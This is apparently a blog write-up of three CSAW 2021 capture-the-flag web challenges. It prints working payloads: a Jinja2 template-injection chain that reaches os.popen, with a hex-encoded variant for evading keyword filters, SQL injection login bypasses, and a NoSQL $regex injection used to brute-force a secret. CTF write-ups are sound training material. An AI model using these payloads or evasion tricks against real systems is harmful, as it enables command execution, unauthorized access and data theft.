---
title: "CSAW - 2021"
date: 2021-09-14T13:13:43+07:00
draft: false 
---

# Ninja
# Type: SSTI

I test `value` param with `{{7*7}}` and it returns `49`.

```
http://web.chal.csaw.io:5000/submit?value={{7*7}}
```

Okay, RCE timeeeeee~

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
```
This payload import class `os` and executes `ls -la` from popen. Send this payload and we get the response:
```
Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
```

It's not hard to bypass this filters
- With `_` we can bypass by `\x5f` (hex encode)
- With `os` we can bypass by `\x6f\x73`
- With `.` we can bypass by `[]` or `attr`

But it still block my request, so I hex encode all string and it works :))
```python
{{
    request
    |attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')
    |attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')
    |attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')
    |attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f')('\x6f\x73')
    |attr('\x70\x6f\x70\x65\x6e')('cat flag.txt')
    |attr('read')()
}}
```
it equivalents to
```python
{{
    request
    |attr('application')
    |attr('__globals__')
    |attr('__getitem__')('__builtins__')
    |attr('__getitem__')('__import__')('os')
    |attr('popen')('cat flag.txt')
}}
```

And we got flag here...

# no-pass-needed
# Type: SQL injection

I'm so lucky firstblood this challenge when i test my familiar payload, and it works.

```
username=admin'or(1)--+-&password=a
```
This challenge replace some strings. When you duplicate this you can bypass it easily
```
username=adadminmin'--&password=a
```
And we got flag here...

# securinotes
# Type: nosql injection

This chall is closed, so i only tell you idea to solve it.

Register one account and login, then catch this request via burpsuite and I found some public Meteor methods (`notes.count`, `notes.add`, `notes.remove`)

```javascript
// $ne is "not equal"
[{"body":{"$ne":""}]

[{"body":{"$regex":"flag.*"}]
// It return true, else when you use other char it will return false
// Here we can change $ne to $regex to bruteforce the flag

[{"body":{"$regex":"flag{`next_char`.*"}]
```

I use console from devtools to brute it, and got flag...